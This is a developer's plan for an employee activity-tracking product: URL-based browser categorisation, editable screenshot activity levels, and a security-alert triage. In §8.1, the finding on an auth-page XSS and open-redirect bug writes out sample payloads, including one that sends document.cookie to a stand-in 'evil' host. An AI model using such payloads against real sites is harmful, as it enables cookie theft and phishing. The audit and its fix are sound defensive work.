# PLAN — Browser-aware activity classification + editable screenshot activity

Status: **proposal, nothing implemented yet.**
Scope: `Dashboard-Backend`, `Dashboard-Web`, `Tauri-App-Extension`.

Three requests, treated as three separate issues because they have different
blast radii and can ship independently:

| # | Issue | Ships without an agent release? |
|---|-------|--------------------------------|
| 1 | Browser time must be categorised by the **URL**, not by the browser app | Yes |
| 2 | Agent should sniff what's accessed and know its own activity category | No (agent release) |
| 3 | Edit a screenshot's activity %, propagating across the clock-in stretch | Yes |
| 4 | GitHub security alerts — §8–§11, **revised for 592 in Part IV (§32–§38)** | Yes |
| 5 | Defender/Avast block the installer — §12–§15 | No (build + agent) |
| 6 | Ownership (Soft Fix / Virtual Callers) + developer credits — §16–§17 | No (agent UI) |
| 7 | Local classification cache in the agent (offline + tamper-resistant) — §18–§23 | No (agent release) |

> **Delivery constraint (see §24):** no purchases, no uploads to third
> parties. Everything is written as code, pushed to GitHub, and shipped by
> triggering the release workflow. **Six of the seven issues are fully
> deliverable that way.** Issue #5 is partially blocked — the code-signing
> certificate is out of scope, and §14.2 says plainly what that leaves
> unfixed.
>
> **Cross-issue note:** §16.1 (publisher name) mattered because it had to
> match a certificate. With no certificate, it drops to a cosmetic choice —
> I just need the string.

## Progress

| Step (§25) | Status | Commit |
|---|---|---|
| 1. **#4 S1** §8.1 auth-page XSS/redirect | ✅ **shipped** — main + `DashboardBackend-Prod` + `Auth-Production`. Verified in-browser: `javascript:` → `/`, `https://evil.example/login` → `/login`, legit path preserved. 7 tests, 500/500 suite green | `0c4ca3a` |
| 2. **#4 S2** §35 stale committed installers | ✅ **shipped** — main + `dashboard-web-production` + `LandingWeb-Prod`. 4 files, ~15 MB, gitignored on both apps. Nothing referenced them; `/api/download` was already the real path | `4a830e0` |
| 3. **#4 S3** pin Actions + base images | ✅ **shipped** — 13 actions → commit SHAs in both workflows, `node:20-alpine` → digest in all 5 Dockerfiles. No mutable refs left | `48956f7` |
| 4. **#4 S5** Dockerfile `USER` + §8.4 perms | ✅ **shipped** — 3 backends dropped to `USER node` (both web apps already had `USER nextjs`); `verify` job scoped to `contents: read`. Every job in both workflows now declares permissions | `c21131a` |
| 5. **#4 S4** dependency bumps | ✅ **partly** — browserslist 4.28.1 → 4.28.8, build verified. **glib cannot be fixed** (§ below). Dependabot now reports **1 vuln, was 3** | `8175353` |
| 6. **#1** browser→URL resolver | ⬜ next |
| 7. **#3** screenshot activity edit | ⬜ |
| 8. **#4 S6** remaining CodeQL fixes | ⬜ |
| 9. **#6** ownership + credits | ⬜ |
| 10. **agent release** (#5 A4/A5/A7, #2, #7) | ⬜ |
| 11–13. docs, §36 tuning, dismissals | ⬜ |

Production branches synced this round: `DashboardBackend-Prod`,
`Auth-Production`, `LandingWebBackend-Prod`, `dashboard-web-production`,
`LandingWeb-Prod` — all zero-drift verified.

**Findings from execution that change the plan:**

- **D2 is resolved — §8.2 is safe to ship.** All five Dockerfiles set
  `ENV NODE_ENV=production`, so `disableTlsVerificationInDev: !isProduction`
  is already false in every deployed container. TLS verification is on today;
  the hardening is pure defence in depth, not a behaviour change.
- **The dirty `Cargo.toml` was a phantom.** `git diff --ignore-cr-at-eol`
  shows no content change — it was CRLF noise, now reverted. C3's warning
  about it tangling with the agent release no longer applies.
- **glib / RUSTSEC-2024-0429 is genuinely unfixable from here.**
  `cargo update -p glib` locks 0 packages: the 0.18 line has no patched
  release, and glib is pulled by the GTK stack (atk → cairo-rs → gdk → gtk)
  behind wry's Linux webkit2gtk backend. The fix is in glib ≥ 0.20, which
  nothing in the tauri stack has moved to. Already recorded as accepted risk
  in `src-tauri/Cargo.toml`, and the agent ships Windows/macOS where that
  path is not built. **Treat Dependabot #43 as accepted, not actionable.**
- **Unblocked by step 2:** Issue #5's A0 signature check can now be run
  against the GitHub release artifact (it was measuring the stale binary).

## Contents

**Part I — the three original requests**
- §0 What the code does today · §1 Browser→URL categories (§1.5 cost, §1.6 changing history)
- §2 Agent sends the URL · §3 Editable screenshot activity (§3.3 all logic cases, §3.4 open question)
- §4 Phasing · §5 Tests · §6 Incidental findings · §7 Questions for you

**Part II — added scope**
- §8–§11 Security alerts: §8 real fixes · §9 false positives · §10 phasing
- §12–§15 AV blocking: §12 diagnosis · §13 fixes · **§14 revised for no-cost delivery**
- §16–§17 Ownership + developer credits
- §18–§23 Agent classification cache: **§19 the "user can't change it" answer honestly**
- §24 **Scope — what ships without you paying or uploading anything**

**Part III — integration review (read this before starting)**
- §25 **Unified execution order** · §26 Cross-issue collisions (**C1, C4 are traps**)
- §27 Deploy-time aftermath (**D1 index lock, D2 TLS, D3 install mode**)
- §28 Behavioural aftermath · §29 Branch sync map · §30 Rollback · §31 Definition of done

**Part IV — security alerts revised (592, was 36)**
- §32 What the 592 actually are (**9 tools; CodeQL still 36**) · §33 Root-cause consolidation
- §34 Verifications (**no leaked credentials**) · §35 **Stale committed installers**
- §36 Tune `security.yml` · §37 Revised phasing · §38 What is unchanged

**If you read only four things:** §25 (order), §26 C4 (double-count trap),
§27 D1 (index that can freeze ingest), §35 (users may be downloading a
21-version-old agent).

---

---

# Part I — the three original requests

## 0. What the code does today (verified, not assumed)

### 0.1 Where a category comes from

`activity_categories` rows are `(match_type, pattern, category)` where
`match_type` is `'app'` or `'domain'`. `buildCategoryLookup()`
([routes.js:139](Dashboard-Backend/src/modules/activity/routes.js:139)) loads
them all into a `Map` and returns `lookup(matchType, pattern)`, defaulting to
`"unclassified"`.

Three feeds consume it:

| Feed | Line | Category key used |
|------|------|-------------------|
| screenshots | [routes.js:1174](Dashboard-Backend/src/modules/activity/routes.js:1174) | `lookup("app", app_name)` |
| apps | [routes.js:1212](Dashboard-Backend/src/modules/activity/routes.js:1212), [:1240](Dashboard-Backend/src/modules/activity/routes.js:1240) | `lookup("app", appName)` |
| urls | [routes.js:1318](Dashboard-Backend/src/modules/activity/routes.js:1318), [:1389](Dashboard-Backend/src/modules/activity/routes.js:1389) | `lookup("domain", domain)` |

### 0.2 The actual defect

A browser is a **container**, not an activity. Today:

- A screenshot taken while Chrome is focused is categorised as *Chrome*.
  Nobody classifies "Google Chrome" as productive (it isn't — it depends), so
  it lands `unclassified`, which the member rollups fold into **neutral**
  ([routes.js:1259](Dashboard-Backend/src/modules/activity/routes.js:1259),
  [:1407](Dashboard-Backend/src/modules/activity/routes.js:1407)).
- The Apps tab does the same: every second of browsing collapses into one
  "Google Chrome" row with one category.
- The URLs tab, on the *same seconds*, correctly reports those domains as
  productive.

**So the product currently contradicts itself: Apps says a member was 0%
productive while URLs says 100%, from identical data.** That's the bug behind
"the productivity increases in case the app is a browser … but the accessed
URLs is productive".

Note the two orthogonal concepts, which the fix must not conflate:

- **Activity level** (0–100) = input intensity. Browsing genuinely produces a
  lot of scroll/click input — a high number here is *not wrong*.
- **Category** (productive / neutral / distracting) = what the work was.
  For a browser this is a property of the **URL**, never of the browser.

The fix is entirely in the second column. We do not scale activity level for
browsers.

> **Assumption to confirm:** the above is my reading of the request. If the
> intent was instead "browser time should be weighted *down* because browsing
> inflates the input score", say so — that's a different change (scoring, in
> `capture/activity.rs`), and I'd argue against it: the input score is
> evidence, and bending evidence per-app makes it unauditable.

### 0.3 What already exists and must be reused (not rebuilt)

| Helper | Location | Does |
|---|---|---|
| `isBrowserAppName(name)` | [app-name.js](Dashboard-Backend/src/modules/activity/app-name.js) | regex over chrome/firefox/edge/opera/brave/safari/vivaldi/chromium |
| `parseDomain(url)` | [routes.js:157](Dashboard-Backend/src/modules/activity/routes.js:157) | hostname, `www.` stripped |
| `extractHttpUrl(text)` | [routes.js:165](Dashboard-Backend/src/modules/activity/routes.js:165) | pulls an `http(s)://…` out of a window title |
| `titleFromBrowserPageTitle` | [routes.js:170](Dashboard-Backend/src/modules/activity/routes.js:170) | strips " - Google Chrome" etc. |
| `siteNameFromWindowTitle` | [routes.js:188](Dashboard-Backend/src/modules/activity/routes.js:188) | "… \| GitHub" → `GitHub` |
| `ingestAppUrlRow` | [routes.js:1321](Dashboard-Backend/src/modules/activity/routes.js:1321) | already derives URLs from browser app logs for the URLs feed |

Every input needed for issue #1 is already in the codebase. Issue #1 is
**wiring, not new machinery** — no new table, no new agent release, and it
fixes all historical data retroactively because it's resolved at read time.

### 0.4 Agent pipeline (Tauri)

- Tick loop ([tracker.rs:375](Tauri-App-Extension/src-tauri/src/agent/tracker.rs:375)):
  - app slice every `APP_LOG_INTERVAL_SEC` = **15s**
  - screenshot every `SCREENSHOT_MIN..MAX_DELAY_SEC` = **90–210s**, and
    **skipped entirely while idle** —
    [tracker.rs:454](Tauri-App-Extension/src-tauri/src/agent/tracker.rs:454)
    and [:685](Tauri-App-Extension/src-tauri/src/agent/tracker.rs:685)
    both guard on `!idle_now`. *(This fact is load-bearing for issue #3.)*
- `upload_app_slice` ([tracker.rs:1143](Tauri-App-Extension/src-tauri/src/agent/tracker.rs:1143))
  posts the app event and, if the window is a browser, a URL event **on the
  same tick** — so app and URL rows are already time-aligned to within 15s,
  they're just not linked by an id.
- URL capture is real sniffing already: PowerShell UIAutomation on Windows,
  AppleScript on macOS, on a bounded thread
  ([events.rs:142](Tauri-App-Extension/src-tauri/src/capture/events.rs:142)).
- The `Screenshot` event
  ([types.rs:24](Tauri-App-Extension/src-tauri/src/types.rs:24)) carries
  `app_name`, `page_title`, `activity_level`, `signal` — **no URL**. That's
  the gap for issue #2.
- The agent already receives server-pushed classification rows via
  `apply_display_names` ([events.rs:75](Tauri-App-Extension/src-tauri/src/capture/events.rs:75)) —
  today only the display name is used, the `category` is discarded. That's
  the channel issue #2 extends.

---

## 1. Issue #1 — Browser time categorised by URL

### 1.1 Design

One shared resolver, used by every feed, replacing three scattered
`categoryLookup("app", …)` call sites:

```
resolveActivityCategory({ appName, pageTitle, urlIndex, sessionId, at })
  if !isBrowserAppName(appName)        -> lookup("app", appName)      // unchanged
  // browser: the URL decides
  1. urlIndex hit for (sessionId, at)  -> lookup("domain", domain)
  2. extractHttpUrl(pageTitle)         -> lookup("domain", parseDomain(url))
  3. siteNameFromWindowTitle(...)      -> lookup("domain", siteName)
  4. otherwise                         -> lookup("app", appName)      // honest fallback
```

Steps 2–4 are exactly what `ingestAppUrlRow` already does for the URLs feed —
lifted into a shared helper so all three feeds agree by construction rather
than by three copies staying in sync.

**`urlIndex`** = per-session interval index built once per request from
`activity_url_logs` rows already being fetched, matching an app log or
screenshot to the URL row whose
`[visited_at, visited_at + duration_seconds]` covers the timestamp, with a
±`APP_LOG_INTERVAL_SEC` (15s) tolerance because the two events fire on the
same tick but land in separate inserts.

### 1.2 Changes

**`Dashboard-Backend/src/modules/activity/category-resolver.js`** *(new, ~70 lines)*
- `buildUrlIndex(urlRows)` → `Map<sessionId, sorted intervals>`
- `resolveActivityCategory({...})` as above
- Exported pure functions so they're unit-testable with no DB.

**`Dashboard-Backend/src/modules/activity/routes.js`**
- screenshots feed: fetch URL logs for the same scope/day window, build the
  index, use the resolver. Also return the resolved `matchedDomain` so the UI
  can show *why* a screenshot is categorised as it is.
- apps feed: same. Browser rows additionally get a `viaUrl: true` marker.
- urls feed: unchanged behaviour, but routed through the shared helper so
  there is one implementation.

**`Dashboard-Backend/src/lib/postgres/activity-events-postgres.service.js`**
- `fetchPgUrlLogs` gains the `options.sinceDay` parameter that
  `fetchPgScreenshots`/`fetchPgAppLogs` already have (it's the only one of the
  three missing it — an existing inconsistency).

**`Dashboard-Web`**
- Apps table: browser rows show the resolved category with a small "via URL"
  hint, so a manager isn't confused about why Chrome now reads *productive*.
- Screenshots: the category badge tooltip names the domain it matched.

### 1.3 Decision: should the Apps tab split a browser into per-domain rows?

**Recommendation: no, not now.** Keep one "Google Chrome" row whose *category
distribution* is URL-derived, and let the URLs tab be the per-domain view. A
per-domain split in the Apps tab duplicates the URLs tab wholesale — that's
two screens showing the same rows, which is how a UI stops being trusted.
Revisit only if someone actually asks for browser breakdown *inside* the Apps
tab.

### 1.4 Trade-offs

| Option | Pro | Con |
|---|---|---|
| **Resolve at read time (chosen)** | fixes all history, no migration, no agent release, one place to change | small per-request join cost (§1.5); a re-classification changes past reports — correct, but visible (§1.6) |
| Denormalise a `category` column at write time | cheap reads | wrong the moment someone classifies a new domain; needs a backfill job; two sources of truth |
| Agent sends the category | exact | needs a release; agent's category cache goes stale; still can't fix history |

Both cons of the chosen option are addressed below rather than accepted.

### 1.5 Mitigating the per-request cost — this ends up *faster* than today

**The feed is already paying a bigger cost than the one I'm adding.**
`buildCategoryLookup()` calls `getAllCategories()`
([activity-categories.js:40](Dashboard-Backend/src/modules/classification/activity-categories.js:40)),
which runs `SELECT … FROM activity_categories ORDER BY match_type, pattern`
**on every single `/api/activity/feed` request**, uncached, for a table that
changes a few times a month.

| # | Mitigation | Effect |
|---|---|---|
| **M1** | **Cache the classification lookup.** `lookup-cache.js` already implements exactly the needed pattern — 15s TTL plus `subscribeChanges` invalidation keyed on a resource name. Reuse it verbatim for `activity_categories`, invalidated from `setCategory`/`removeCategory`. | Removes one full-table query **per request**. This alone outweighs the join being added — net latency should go **down**, not up |
| **M2** | **Skip the URL query when there is nothing to resolve.** Guard on `rows.some(r => isBrowserAppName(r.app_name))` before issuing it. | A result set with no browser rows pays exactly zero |
| **M3** | **Add the missing index.** `activity_url_logs` has `(member_id, visited_at DESC)` and `(visited_at DESC)` but **no `session_id` index** — while `activity_app_logs` has `idx_act_app_session_open`. The resolver looks rows up by `(session_id, visited_at)`. `CREATE INDEX IF NOT EXISTS idx_act_url_session_visited ON activity_url_logs (session_id, visited_at);` | Also fixes an **existing latent problem**: `deleteActivitySessionWithChildrenPg` already runs `DELETE FROM activity_url_logs WHERE session_id = $1` ([activity-events-postgres.service.js:404](Dashboard-Backend/src/lib/postgres/activity-events-postgres.service.js:404)), which is a sequential scan on every session delete today |
| **M4** | **Build the index properly: O((n+m) log n), not O(n·m).** Group URL rows by session, sort once by `visited_at`, binary-search per app/screenshot row. | The naive `.find()` inside `.map()` is the obvious wrong implementation and goes quadratic at the existing `LIMIT 500` on both sides. Called out here so it isn't written that way |
| **M5** | Both queries stay bounded at the existing `LIMIT 500`. | Worst case is fixed and small |

Verify with `EXPLAIN ANALYZE` on the URL fetch before and after M3, and a
timing on `/api/activity/feed?type=apps` before and after M1.

### 1.6 Mitigating "past reports change" — narrower than it first looks

**First, a correction from checking the code:** `saved_reports` stores only
`(member_id, page_id, title, tag)`
([ensure-lookup-schema.js:1682](Dashboard-Backend/src/lib/postgres/ensure-lookup-schema.js:1682))
— it is a **bookmark, not a snapshot**, and re-queries live data on open. So
there is no stored artifact quietly drifting underneath anyone. The only
frozen artifacts are `.xlsx` files a manager already downloaded, and those
cannot change.

The real exposure is therefore exactly one scenario: **someone exports this
month, exports again next month, and the same period reports different
numbers with nothing explaining why.**

| # | Mitigation | Rationale |
|---|---|---|
| **M1** | **Keep retroactive as the default.** | It is what users actually expect: "I just told you Reddit is distracting — why does last week still say neutral?" A time-travelling classification would generate that complaint on day one |
| **M2** | **Stamp exports with the classification time.** Both export paths already write footer rows — `["Period", …]`, `["Category Filter", …]`, `["Exported At", …]` ([apps.tsx](Dashboard-Web/features/activity/components/apps.tsx), [urls.tsx](Dashboard-Web/features/activity/components/urls.tsx)). Add `["Categories as of", <max(activity_categories.updated_at)>]`. | ~2 lines. Two exports that disagree now explain themselves |
| **M3** | **Surface recent reclassification in-page.** `activity_categories.updated_at` already exists. If any classification changed inside the viewed period, show one quiet line: *"4 apps/sites were reclassified since this period — figures reflect current classifications."* | Turns a silent change into a stated one, using a column that is already there |
| **M4** | **Escape hatch, not built now:** if frozen history is ever a hard requirement, it is `activity_categories.effective_from` plus a temporal lookup. | `// ponytail: classification is current-state, not bitemporal — add effective_from only if someone needs a report to reproduce byte-for-byte a year later` |

M2 and M3 together are roughly half a day and remove the surprise, which is
the actual complaint — not the retroactivity itself, which is correct.

---

## 2. Issue #2 — Agent sniffs the URL and knows its category

This is the **only** part needing an agent release, which is why it's staged
after #1 rather than bundled with it.

### 2.1 Screenshot events carry the URL

- Cache the last successful URL capture in `EventBuilder`
  (`last_url: Mutex<Option<(String, Instant)>>`), written by the existing
  `url_slice` path — **no new subprocess spawn**, so zero added cost per tick.
- `EventBuilder::screenshot` attaches `url` + `domain` when the focused window
  `is_browser` and the cached URL is fresher than
  `APP_LOG_INTERVAL_SEC * 2` (30s); otherwise it sends nothing rather than a
  stale URL.
- `ActivityEvent::Screenshot` gains `url: Option<String>`.
  **Constraint:** [types.rs:678](Tauri-App-Extension/src-tauri/src/types.rs:678)
  has a test asserting the event enum carries no keylogging-shaped field —
  `url` doesn't trip its forbidden list, but the test must be re-read before
  touching that enum, not after.
- Backend ingest ([routes.js:862](Dashboard-Backend/src/modules/activity/routes.js:862))
  persists it; new nullable columns `activity_screenshots.url`,
  `.domain`, applied by `ensure-lookup-schema.js` like every other column.
- Resolver from §1.1 gains a **step 0**: use the screenshot's own stored
  domain when present. Steps 1–4 stay as the fallback for every row captured
  before the agent update — so old data keeps working and new data gets exact.

### 2.2 Agent-side category awareness

Extend the existing display-name push to carry `category` per pattern, so the
agent can locally answer "is the current window productive?".

**Ponytail check — what this actually buys:**
- Live "current activity: productive" in the agent UI. *Real value.*
- Correct category in the offline queue. *Value only if we ever store the
  agent's category verdict — we don't, the server resolves it. So: no value.*
- Anything the server can't do. *Nothing.*

**Recommendation: ship §2.1 (URL on screenshot), defer §2.2 until the agent
UI actually wants to display a category.** Pushing a classification table to
every desktop client to compute something the server already computes is
duplicated logic with a staleness window — the exact "two sources of truth"
the codebase's own comments warn about
([events.rs:31](Tauri-App-Extension/src-tauri/src/capture/events.rs:31)).

> **⚠️ Superseded — see Issue #7 (§18).** The above deferred this on the
> grounds that nothing concrete needed it. Offline-mode display *is* that
> need, so §2.2 is promoted. §18 also resolves the "two sources of truth"
> objection: the cache is display-only and the server never accepts a
> category from the agent, so it is a cache, not a second authority.

### 2.3 Privacy note

URL capture already exists and is already governed by
`capture-minimization-postgres.service.js` (`urlDomainOnly` strips full URLs
to a domain) and exclusion rules (`matchesExclusion`). Storing a URL on the
screenshot row **must** run through the same two gates — this is not new data
collection, and it must not become new data collection by bypassing the
minimiser. Exclusions currently drop the URL *event*; a screenshot's embedded
URL must be dropped by the same check at
[routes.js:909](Dashboard-Backend/src/modules/activity/routes.js:909).

---

## 3. Issue #3 — Edit a screenshot's activity %

### 3.1 What must never be lost

`activity_level` is *evidence*, produced from raw counters that are stored
beside it (`keystroke_count`, `distinct_key_count`, `mouse_distance_px`,
`injected_event_count`). An edit that overwrites it in place destroys the
audit trail of a time-tracking product. So:

```sql
ALTER TABLE activity_screenshots ADD COLUMN IF NOT EXISTS activity_level_original INTEGER;
ALTER TABLE activity_screenshots ADD COLUMN IF NOT EXISTS activity_level_edited_by UUID;
ALTER TABLE activity_screenshots ADD COLUMN IF NOT EXISTS activity_level_edited_at TIMESTAMPTZ;
ALTER TABLE activity_screenshots ADD COLUMN IF NOT EXISTS activity_level_edit_reason TEXT;
```

`activity_level_original` is written **only on the first edit** (`COALESCE`),
so re-editing never loses the agent's original measurement.

> **Correctness trap — must be in the same PR.** The integrity sweep reads
> `AVG(activity_level)`
> ([integrity-postgres.service.js:28](Dashboard-Backend/src/lib/postgres/integrity-postgres.service.js:28))
> to detect "high activity while on distracting sites"
> ([integrity-checks.js:25](Dashboard-Backend/src/modules/activity/integrity-checks.js:25)).
> If a manager can edit that number, anti-cheat becomes editable. Both
> integrity queries must switch to
> `COALESCE(activity_level_original, activity_level)` so integrity is always
> judged on what the agent actually measured.

### 3.2 Propagation scope — "the same period of clocking in"

**Definition — a *capture run*:** screenshots sharing a `session_id`, ordered
by `captured_at`, cut into runs wherever the gap between consecutive captures
exceeds `screenshot_max_delay_sec + grace`.

**Why a gap means idle:** the agent provably does not capture while idle
(`if !idle_now && now >= state.next_screenshot_at`, both tick paths). So a
gap longer than the maximum scheduled delay can only mean idle, a pause, or
the agent being down — all of which are exactly the boundaries the user wants
respected.

There is **no per-interval idle record anywhere in the schema** — sessions
carry only a cumulative `idle_seconds`
([schema.sql:781](Dashboard-Backend/src/lib/postgres/schema.sql:781)).
Inventing an `activity_idle_segments` table to serve this one feature is the
over-built path; the gap signal already exists and is faithful.
`// ponytail: gap-derived run boundaries, exact idle segments if a timeline UI ever needs them.`

Grace = `screenshot_max_delay_sec` (server setting, default 210s) × 1.5,
read from `activity_scoring_settings` rather than hardcoded, because that
setting is already server-tunable and a hardcoded 210 would silently break
for any org that raised it.

### 3.3 Every logic case

| Case | Behaviour |
|---|---|
| Idle **before** the edited shot | run starts after the gap — earlier captures untouched |
| Idle **after** | run ends at the gap — later captures untouched |
| Idle on **both** sides | run = only the captures between the two gaps |
| No idle in the whole session | run = the whole session |
| Break button (session → `idle` → `resume`) | capture stops during the break ⇒ gap ⇒ run splits. Same rule, no special case |
| The shot is alone in its run | only that row changes |
| Two sessions in one day | never crosses `session_id` |
| Session still open (member tracking now) | applies to captures taken so far; captures **after** the edit keep their own fresh measurement — an edit is a correction of the past, not a standing override |
| Agent crashed and restarted mid-session | long gap ⇒ separate runs. Correct: they weren't one continuous stretch |
| `source = 'web'` rows | same rule — same table, same columns |
| Already-edited run | `activity_level_original` preserved from the first edit |
| Value outside 0–100 | `400`, rejected before write (matches the column's CHECK) |
| Screenshot deleted between open and save | `404`, no partial write |
| Caller lacks permission | `403`, same gate as delete |
| `applyToRun: false` | exactly one row changes |

Write path is a single transaction (`withTransaction`) so a run update is
all-or-nothing.

### 3.4 Open decision — does this change *session* time?

**It does not today, and I recommend it stays that way.**

`activityPercent` on the Command Center is
`activeSeconds / trackedSeconds`
([command-center-service.js:218](Dashboard-Backend/src/modules/dashboard/command-center-service.js:218))
— derived from `activity_sessions.active_seconds`, which has **no
relationship** to `activity_level`. So editing a screenshot changes the
Activity pages and the integrity view, not billable time.

Making the edit rewrite `active_seconds` would mean:
- rewriting the time ledger (and therefore payroll/invoice inputs) from a
  screenshot slider;
- fighting `updatePgSession`, which deliberately rejects downward
  `active_seconds` writes and records them as a **security event**
  ([activity-events-postgres.service.js:507](Dashboard-Backend/src/lib/postgres/activity-events-postgres.service.js:507));
- cascading into `daily_member_active_seconds` and the task rollups.

That's a different, much larger feature ("manager adjusts tracked time"), and
manual time entry / approvals already exist for it.

**Question for you:** when you said the edit should "immediately affect the
sessions", did you mean (a) the other **screenshots** in that stretch — which
is what this plan implements — or (b) the session's **tracked time**? If (b),
that's a separate plan and I'd want to route it through the existing manual-
time-approval path rather than a slider on a screenshot.

### 3.5 API

```
PATCH /api/activity/screenshot/:id/activity
body: { activityLevel: 0..100, applyToRun?: boolean = true, reason?: string }
200:  { success: true, data: { updated: 6, ids: [...], runStart, runEnd } }
```

Auth mirrors the existing DELETE route
([routes.js:1041](Dashboard-Backend/src/modules/activity/routes.js:1041))
exactly: bearer token → `resolveMember` → `isManagementRole` →
`resolveActivityFeedScope(ownerId)` → act. Same gate, same failure codes —
no new permission concept.

### 3.6 UI

`Dashboard-Web/features/activity/components/screenshots.tsx`, modal footer,
next to **Download**, gated on the same `canManage` as Delete:

- **Edit activity** button → small inline panel: slider + number input
  (0–100), optional reason, and a live line: *"Applies to 6 captures in this
  stretch (10:04 – 11:12)"* with a checkbox to narrow it to this capture only.
- Save → `PATCH`, then `reload({force:true})` + `reloadInsights({force:true})`
  (the pattern `handleDeleteScreenshot` already uses).
- Edited captures render an "edited" marker; hover shows
  *"was 34% — changed by <name> on <date>"*. The original number stays
  visible somewhere, always.

---

## 4. Phasing

| Phase | Content | Touches agent? | Independently shippable |
|---|---|---|---|
| **1** | §1 browser→URL category resolver + feed wiring + tests, including §1.5 (cache, index, skip-guard) and §1.6 M2/M3 (export stamp, reclassification notice) | No | Yes — fixes the contradiction on all existing data |
| **2** | §3 screenshot activity edit: schema, `PATCH`, integrity fix, UI | No | Yes |
| **3** | §2.1 agent sends URL with screenshots + resolver step 0 | Yes | Yes (resolver falls back for old rows) |
| **4** | §2.2 agent-side category cache | Yes | Deferred until the agent UI needs it |

Phases 1 and 2 are independent of each other and can run in parallel or
either order.

## 5. Tests

- **Resolver (pure, no DB):** browser + productive domain → productive;
  browser + no URL anywhere → falls back to app category; non-browser →
  untouched; window-title-only row → site-name path; URL 20s from the
  screenshot → outside tolerance, not matched.
- **§1.5 M1 cache invalidation:** classify a domain → the very next feed
  request reflects it. A cache that needs 15s to notice a just-saved
  classification would look exactly like the bug this plan is fixing, so this
  is the one cache test that earns its place.
- **§1.5 M4 index build:** 500 URL rows × 500 app rows completes without a
  quadratic blowup (assert the lookup is binary-searched, not scanned).
- **Run splitting (pure):** the twelve cases in §3.3 as a table-driven test —
  this is the logic most likely to be got wrong, and the cheapest to pin.
- **Integrity:** a sweep over an edited screenshot flags on the *original*
  value, not the edited one.
- **Route:** non-management role → 403; out-of-range value → 400; missing
  screenshot → 404.
- Existing suite (493 tests) must stay green.

## 6. Incidental findings (not in scope, worth knowing)

1. [routes.js:1172](Dashboard-Backend/src/modules/activity/routes.js:1172) —
   `activityLevel: d.activity_level ?? 75` is dead: the column is
   `NOT NULL DEFAULT 50`, so `?? 75` can never fire, and the two numbers
   disagree about what "unknown" means.
2. The URLs feed classifies window-title-derived rows under
   `lookup("domain", …)` where the "domain" may be an app name
   ([routes.js:1362](Dashboard-Backend/src/modules/activity/routes.js:1362)) —
   so `Google Chrome` can end up as a *domain* pattern in the classify list.
3. `fetchPgUrlLogs` lacks the `sinceDay` option its two sibling fetchers have
   (folded into Phase 1 since that phase needs it anyway).

---

## 7. What I need from you before starting

1. §0.2 — confirm the browser/URL reading is what you meant.
2. §3.4 — "affect the sessions": other **screenshots** in the stretch (a), or
   the session's **tracked time** (b)?
3. §2.2 — agent-side category cache: build now, or defer until the agent UI
   shows a category?

---

# Part II — added scope

# Issue #4 — GitHub security alert backlog

> **Scope note.** §8–§11 cover the **36 CodeQL alerts**, each verified against
> the current code. The queue has since grown to **592 across nine tools** —
> **Part IV (§32–§38) triages the rest**, and confirms CodeQL is still exactly
> these 36. Everything in §8 and §9 stands unchanged; only the phasing was
> replaced (§10 → §37).

Within the CodeQL set: **6 root causes worth fixing** (covering 13 alerts) and
**23 false positives** to dismiss with a written reason so they stop consuming
attention on every future scan.

The single item that actually matters — in the CodeQL 36 **and** in all 592 —
is §8.1. Everything else is hygiene.

## 8. Real — fix these

### 8.1 🔴 XSS + open redirect on the auth action page — alerts #25, #26, #21, #22

**Four alerts, one root cause, duplicated across two byte-identical files**
(`diff` confirms `Dashboard-Backend/hosting-public/__/auth/action.html` and
`Auth-Backend/hosting-public/__/auth/action.html` are the same file).

```js
var continueUrl = params.get("continueUrl") || "";   // line 225 — raw query param
...
actionBtn.href = buttonHref;                          // line 273 — no scheme check
```

The *success* path is safe: `resolveContinuePath()` (line 244) reduces the URL
to `pathname + search + hash`, so it can only ever be origin-relative. **The
three error paths do not** — lines 298, 309 and 342 pass **raw `continueUrl`**
straight through to the button's `href`:

- `?mode=bogus&continueUrl=javascript:fetch('//evil/'+document.cookie)`
  → renders "Back to sign in", one click executes attacker JS **on the auth
  origin**.
- `?mode=bogus&continueUrl=https://evil.example/login`
  → a real, correctly-branded verification page on your domain whose only
  button sends the user to a credential-harvesting clone.

This is the email-verification / password-reset page — the highest-trust
surface in the product, and the one users are trained to click links into.
Both exploit paths need nothing but a crafted link.

**Fix** (same as `resolveContinuePath` already does, applied to the error
paths too): run every `buttonHref` through one validator that accepts only a
same-origin relative path, falling back to `/`. ~8 lines, applied once and
copied to the second file — or better, resolve the duplication so the next
fix only has to be made once.

### 8.2 🟠 TLS verification disabled by absence of `NODE_ENV=production` — #23, #24

```js
if (config.security.disableTlsVerificationInDev) {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
}
// env.js:70 — disableTlsVerificationInDev: !isProduction
```

It *is* gated, so CodeQL's "certificate validation disabled" is not the naked
finding it looks like. The problem is the **direction it fails**: an
unset or misspelled `NODE_ENV` in a Coolify container silently disables
certificate validation for every outbound call the backend makes. Security
posture should never depend on an env var being *present*.

**Fix:** require an explicit opt-in — `DISABLE_TLS_VERIFY=true` **and**
`!isProduction` — and log loudly when it engages. ~3 lines per backend.

### 8.3 🟠 Full email bodies written to logs — #7

`Notify-backend/.../email/transactional-email.js:69` logs `input.text` — the
entire message body — when SMTP is unconfigured. Those bodies contain
verification and password-reset links. Intended as a dev convenience; in a
prod deploy that lost its SMTP config it becomes a log-file credential leak.

**Fix:** log recipient + subject + "SMTP not configured", never the body,
outside development.

### 8.4 🟡 Workflow job with no `permissions:` — #1

`.github/workflows/release.yml` — the `build` and `release` jobs declare
`permissions:` (lines 71, 145); the `verify` job (line 41) does not, so it
inherits the repo default, which for many repos is write-all on a job that
only needs to check out and run tests.

**Fix:** `permissions: { contents: read }` on the verify job, or a top-level
default with per-job escalation. One line.

### 8.5 🟡 Polynomial regex on request-controlled input — #37, #38, #4

- `Dashboard-Backend/src/http/auth-token.js:4` and its Auth-Backend twin:
  `/^Bearer\s+(.+)$/i` — `\s+` next to `.+` backtracks quadratically on a
  header of repeated whitespace that never matches. Bounded in practice by
  Node's ~16KB header cap, so this is slow-path noise, not an outage.
- `app-public-url.js:5`: `/\/+$/` on a trailing-slash run.

**Fix:** `/^Bearer\s+(\S.*)$/i` and a non-backtracking trim. One line each,
worth taking purely because they're cheaper to fix than to re-triage.

### 8.6 🟡 Real substring-on-URL checks — #17, #8

Only **2 of the 13** "incomplete URL substring sanitization" alerts are the
real pattern:

- `sidebar-section.tsx:23` — `url.includes("api.dicebear.com")`. Worst case:
  `https://evil.com/?x=api.dicebear.com` skips a cache-buster query param.
- `profile-avatar.js:102` — `authPhoto.includes("firebasestorage.googleapis.com")`
